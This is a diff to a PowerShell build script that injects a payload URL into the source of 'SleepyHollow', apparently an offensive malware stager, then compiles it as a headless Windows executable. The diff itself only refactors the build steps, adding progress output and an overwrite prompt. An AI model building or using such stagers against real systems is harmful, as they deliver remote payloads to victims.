@@ -5,7 +5,7 @@ param(
     [string]$OutputPath = ".\SleepyHollow.exe"
 )
 
-$oldContent = Get-Content ".\Program.cs"
+$oldContent = [System.IO.File]::ReadAllText(".\Program.cs")
 
 function Replace-PayloadUrl{
     param(
@@ -26,19 +26,37 @@ function Restore-Content{
     )
 
     $filePath = ".\Program.cs"
-    Set-Content $filePath $oldContent
+    Set-Content $filePath $oldContent -Force
+}
+
+function Output-Stager{
+    param(
+        [Parameter(Mandatory=$false)]
+        [string]$OutputPath = ".\SleepyHollow.exe"
+    )
+    if(Test-Path $OutputPath){
+        $title    = 'File already exists'
+        $question = 'Are you sure you want to proceed?'
+        $choices  = '&Yes', '&No'
+
+        $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
+        if ($decision -eq 0) {
+            Move-Item ".\bin\Release\net7.0\win-x64\publish\SleepyHollow.exe" $OutputPath -Force
+        } else {
+            exit
+        }
+    }
 }
 
 function Build-Stager{
-    param(
-        [Parameter(Mandatory=$true)]
-        [string]$PayloadUrl
-    )
-    Replace-PayloadUrl $PayloadUrl
     $projectPath = ".\SleepyHollow.csproj"
-    dotnet publish -c Release /p:DefineConstants="HEADLESS" --self-contained $projectPath
-    Move-Item ".\bin\Release\net7.0\win-x64\publish\SleepyHollow.exe" $OutputPath
+    dotnet publish -c Release /p:DefineConstants="HEADLESS" --self-contained $projectPath > $null
 }
 
-Build-Stager $PayloadUrl
+Write-Progress -Activity "[SleepyHollow] Updating configuration..." -Status "20% Complete:" -PercentComplete 20
+Replace-PayloadUrl $PayloadUrl
+Write-Progress -Activity "[SleepyHollow] Building stager..." -Status "40% Complete:" -PercentComplete 40
+Build-Stager 
 Restore-Content $oldContent
+Output-Stager $OutputPath
+Write-Progress -Activity "[SleepyHollow] Finishing up..." -Status "100% Complete:" -PercentComplete 100
